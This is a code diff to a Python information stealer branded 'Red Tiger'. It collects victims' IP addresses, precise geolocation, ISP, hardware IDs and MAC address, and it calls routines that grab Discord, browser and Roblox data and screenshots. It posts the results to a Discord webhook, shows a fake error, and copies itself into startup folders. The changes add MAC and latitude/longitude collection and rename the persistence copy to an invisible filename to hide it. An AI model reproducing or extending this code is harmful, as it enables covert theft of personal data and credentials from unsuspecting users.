@@ -20,7 +20,7 @@ import socket
 import requests
 from Crypto.Cipher import AES
 import subprocess
-from datetime import datetime
+import datetime
 import base64
 import re
 import string
@@ -53,20 +53,17 @@ def Roblox_Grab():
 def Fake_Error():
     ()
 
-def get_current_datetime():
-    now = datetime.now()
-    return now.hour, now.minute, now.second, now.year, now.day, now.month
-
-hour, minute, second, year, day, month = get_current_datetime()
+def current_time_day_hour():
+    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')
 
 color_embed = 0xB20000
 username_embed = 'Red Tiger'
 avatar_embed = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
 footer_embed = {
-        "text": f"Red Tiger | {month}/{day}/{year} - {hour}:{minute}:{second}",
+        "text": f"Red Tiger | {current_time_day_hour()}",
         "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
         }
-footer_text = f"Red Tiger | {month}/{day}/{year} - {hour}:{minute}:{second}"
+footer_text = f"Red Tiger | {current_time_day_hour()}"
                  
 
 try:
@@ -86,80 +83,79 @@ except:
     displayname_pc = "None"
 
 try:
-        response = requests.get('https://httpbin.org/ip')
-        
-        ip_address_public = response.json()['origin']
-
+    response = requests.get('https://httpbin.org/ip')
+    ip_address_public = response.json()['origin']
 except:
-        ip_address_public = "None"
-
-
-try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))
-
-        ip_address_local = s.getsockname()[0]
-
-        s.close()
-except:
-        ip_address_local = "None"
+    ip_address_public = "None"
 
 
 
 try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(('8.8.8.8', 80))  
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 80))  
 
-        ip_address_ipv4 = s.getsockname()[0]
-        s.close()
+    ip_address_ipv4 = s.getsockname()[0]
+    s.close()
 except:
-        ip_address_ipv4 = "None"
+    ip_address_ipv4 = "None"
 
 
 
 try:
-        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
-        s.connect(('2001:4860:4860::8888', 80))
-
-        ip_address_ipv6 = s.getsockname()[0]
+    ip_address_ipv6 = []
+    all_interfaces = socket.getaddrinfo(socket.gethostname(), None)
+    for interface in all_interfaces:
+        if interface[0] == socket.AF_INET6:
+            ip_address_ipv6.append(interface[4][0])
 except:
         ip_address_ipv6 = "None"
 
 
-
 try:
+    try:
         ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
         ipdata = loads(ipdatanojson)
-except:
+    except:
         ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
         ipdata = loads(ipdatanojson)
-else:
-    ()
 
-try:
-        country = ipdata["country_name"]
-except:
-        country = "None"
-
-try:
-        city = ipdata["city"]
-except:
-        city = "None"
-
-try:
+    try:
         country_code = ipdata["country_code"].lower()
-except:
+    except:
         country_code = "None"
+except:
+    country_code = "None"
 
 try:
-        postal = ipdata["postal"]
-except:
-        postal = "None"
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
+        data = response.json()
+        status = data["status"]
+    except:
+        response = requests.get(f"http://ip-api.com/json/{ip_address_ipv6}")
+        data = response.json()
+        status = data["status"]
 
-try:
-        state = ipdata["state"]
+    if status in ["fail"]:
+        status = "Invalid"
+        ip_adress, country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
+    else:
+        status = "Valid"
+        ip_adress = data["query"]
+        country = data["country"]
+        region = data["regionName"]
+        region_code = data["region"]
+        city = data["city"]
+        zip_postal = data["zip"]
+        latitude = data["lat"]
+        longitude = data["lon"]
+        timezone = data["timezone"]
+        isp = data["isp"]
+        org = data["org"]
+        as_number = data["as"]
+        url_position = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
 except:
-        state = "None"
+    ip_adress, country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number, url_position = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -178,7 +174,10 @@ def System_Grab():
     except:
         system_version_info = "None"
 
-
+    try:
+        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
+    except:
+        mac_address = "None"
     try:
         hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
         stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
@@ -364,14 +363,18 @@ DisplayName : "{displayname_pc}"```""", "inline": False},
 Exploitation : "{system_info} {system_version_info}"
 
 HWID : "{hwid}"
+MAC  : "{mac_address}"
 CPU  : "{cpu_info}, {cpu_core_info} Core"
 GPU  : "{gpu_info}"
 RAM  : "{ram_info}Go"```""", "inline": False},
 
-{"name": f":satellite: | Ip:", "value": f"""```Public   : "{ip_address_public}"
-Local    : "{ip_address_local}"
-Ipv4     : "{ip_address_ipv4}"
-Ipv6     : "{ip_address_ipv6}"```""", "inline": False},
+{"name": f":satellite: | Ip:", "value": f"""```
+Public : "{ip_address_public}"
+Ipv4   : "{ip_address_ipv4}"
+Ipv6   : "{ip_address_ipv6}"
+Isp    : "{isp}"
+Org    : "{org}"
+As     : "{as_number}"```""", "inline": False},
 
 {"name": f":minidisc: | Disk:", "value": f"""```{disk_stats}```""", "inline": False},
 
@@ -381,10 +384,14 @@ Ipv6     : "{ip_address_ipv6}"```""", "inline": False},
 Secondary Screen:
 {second_screen}```""", "inline": False},
 
-{"name": f":flag_{country_code}: | Location:", "value": f"""```Country  : "{country}"
-State    : "{state}"
-Postal   : "{postal}"
-City     : "{city}"```""", "inline": False},
+{"name": f":flag_{country_code}: | Location:", "value": f"""```Country   : "{country} ({country_code})"
+Region    : "{region} ({region_code})"
+Zip       : "{zip_postal}"
+City      : "{city}"
+Timezone  : "{timezone}"
+Latitude  : "{latitude}"
+Longitude : "{longitude}"
+```""", "inline": False},
 
 ] 
     embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)
@@ -1282,7 +1289,7 @@ def Startup():
    try:
     try:
         chemin_script = os.path.abspath(__file__)
-        nouveau_nom = "Service.py"
+        nouveau_nom = "ㅤ.py"
 
         if sys.platform.startswith('win'):  
             dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -1291,14 +1298,14 @@ def Startup():
         elif sys.platform.startswith('linux'):
             dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
         else:
-            ()
+            pass
         chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)
 
         shutil.copy(chemin_script, chemin_nouveau_fichier)
         os.chmod(chemin_nouveau_fichier, 0o777) 
     except:
         chemin_script = sys.executable
-        nouveau_nom = "Service.exe"
+        nouveau_nom = "ㅤ.exe"
         if sys.platform.startswith('win'):  
             dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         elif sys.platform.startswith('darwin'): 
@@ -1310,7 +1317,7 @@ def Startup():
         shutil.copy(chemin_script, chemin_nouveau_fichier)
         os.chmod(chemin_nouveau_fichier, 0o777)
    except:
-       ()
+       pass
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -1328,27 +1335,27 @@ requests.post(webhook_url, json=payload)
 try:
     Startup()
 except:
-    ()
+    pass
 try:
     System_Grab()
 except:
-    ()
+    pass
 try:
     Screenshot_Grab()
 except:
-    ()
+    pass
 try:
     Discord_Grab()
 except:
-    ()
+    pass
 try:
     Browser_Grab()
 except:
-    ()
+    pass
 try:
     Roblox_Grab()
 except:
-    ()
+    pass
 
 payload = {
     'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
@@ -1360,7 +1367,7 @@ requests.post(webhook_url, json=payload)
 try:
     Fake_Error()
 except:
-    ()
+    pass
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -1380,23 +1387,23 @@ while True:
     try:
         System_Grab()
     except:
-        ()
+        pass
     try:
         Roblox_Grab()
     except:
-        ()
+        pass
     try:
         Screenshot_Grab()
     except:
-        ()
+        pass
     try:
         Discord_Grab()
     except:
-        ()
+        pass
     try:
         Browser_Grab()
     except:
-        ()
+        pass
 
     payload = {
     'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
